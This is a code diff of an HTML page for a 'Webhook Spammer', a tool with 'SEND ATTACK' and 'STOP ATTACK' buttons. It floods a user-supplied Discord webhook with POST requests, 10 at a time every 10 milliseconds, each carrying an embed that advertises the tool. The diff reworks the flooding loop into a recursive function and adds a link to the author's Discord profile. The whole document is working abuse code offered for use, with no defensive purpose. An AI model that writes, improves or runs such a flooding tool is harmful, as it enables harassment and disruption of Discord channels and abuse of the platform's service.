@@ -35,10 +35,11 @@
         <input type="text" id="message" placeholder="Enter message to spam">
         <button onclick="startAttack()">SEND ATTACK</button>
         <button onclick="stopAttack()">STOP ATTACK</button>
+        <button onclick="openDiscordProfile()">MESSAGE ME ON DISCORD</button>
     </div>
 
     <script>
-        let interval;
+        let spamming = false;
 
         function startAttack() {
             const webhookUrl = document.getElementById('webhookUrl').value;
@@ -47,27 +48,36 @@
                 alert('Please enter both the webhook URL and the message.');
                 return;
             }
-            interval = setInterval(() => {
-                for (let i = 0; i < 10; i++) { // Sends 10 messages in rapid succession
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            content: message,
-                            embeds: [{
-                                description: '[Sent Using Webhook Spammer](https://therealnibby.github.io/webhookspammer)',
-                                color: 3066993
-                            }]
-                        })
-                    }).catch(error => console.error('Error:', error));
-                }
-            }, 10); // Very short interval for rapid spamming
+            spamming = true;
+            spam(webhookUrl, message);
+        }
+
+        function spam(webhookUrl, message) {
+            if (!spamming) return;
+            for (let i = 0; i < 10; i++) { // Sends 10 messages in rapid succession
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        embeds: [{
+                            description: '[Sent Using Webhook Spammer](https://therealnibby.github.io/webhookspammer)',
+                            color: 3066993
+                        }]
+                    })
+                }).catch(error => console.error('Error:', error));
+            }
+            setTimeout(() => spam(webhookUrl, message), 10); // Call spam recursively
         }
 
         function stopAttack() {
-            clearInterval(interval);
+            spamming = false;
+        }
+
+        function openDiscordProfile() {
+            window.open('https://discord.com/users/irish_beer', '_blank');
         }
     </script>
 </body>
